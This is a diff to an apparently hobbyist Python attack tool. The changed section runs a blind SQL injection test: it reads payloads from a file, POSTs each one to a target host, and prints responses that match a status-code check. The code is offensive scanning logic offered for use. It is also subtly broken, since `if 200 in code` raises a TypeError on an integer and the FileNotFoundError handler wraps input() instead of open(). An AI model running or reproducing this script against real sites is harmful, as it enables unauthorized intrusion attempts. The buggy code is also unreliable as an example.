@@ -8,6 +8,7 @@ import subprocess as sub
 import time
 import platform
 import requests
+from colorama import Fore
 wi="\033[1;37m" #>>White#
 rd="\033[1;31m" #>Red   #
 gr="\033[1;32m" #>Green #
@@ -92,14 +93,22 @@ def main():
            try:
             first_slow_print(wi + yl + '[!]' + wi  + 'Testing Blind Sql Injection on the target')
             url = "http://" + ip
-            sqlw = input('SQLi_Payload location: ')
+            try:
+             sqlw = input(wi + Fore.CYAN + "#" + wi + 'SQLi_Payload location: ')
+            except FileNotFoundError:
+             first_slow_print(wi + rd + "[-]" + wi + "Error, File Not Found.")
             openw = open(sqlw,'r')
             for i in openw:
              i = i.strip()
+             print(wi + yl + "[!]" + wi + "Trying Payload=> " + i)
              blindsql = requests.post(url + "/" + i)
-             print(blindsql)
-           except:
-            print(wi + rd + '[-]' + wi + "Error, most likely the target is not vulnerable")
+             code = blindsql.status_code
+             if 200 in code:
+              print(blindsql)
+             else:
+              pass
+           except TypeError:
+            print(wi + rd + '[-]' + wi + "Error Occured.")
        else:
           print(wi +  rd + '[-]' + wi + "Host is down or blocking the tool's probes")
     except TypeError:
@@ -111,5 +120,3 @@ def main():
     #
 
 main()
-          
-                
